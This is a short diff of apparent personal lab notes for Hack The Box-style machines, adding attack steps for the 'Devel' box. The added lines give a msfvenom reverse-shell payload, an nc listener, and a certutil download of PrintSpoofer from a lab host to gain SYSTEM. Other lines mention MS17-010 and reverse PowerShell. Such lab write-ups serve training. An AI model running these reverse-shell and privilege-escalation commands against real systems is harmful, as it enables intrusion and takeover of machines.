@@ -90,9 +90,13 @@ ncat -lvnp 9001 > backup.7z
   exploit the ethernal blue or ms17-010
   use the exploit, got the authorize system!
 
-# Devel Machine:
-  ftp login, upload aspx
-  exploit kitrapod
+#v Devel Machine:
+  ftp login anonymous
+  upload cmd.aspx, upload nc.exe
+  msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f aspx > shell.aspx
+  put with FTP, curl with listenter nc, got the shell! -> whoami /priv
+  vuln SeImpersonatetoken, download PrintSpoofer.exe, upload with certutil -f -split -urlcache http://10.10.14.7:8009/PrintSpoofer.exe
+  access it then got the root!
   
 # Optimum Machine:
   command injection, reverse with invoke-powershell, MS16032
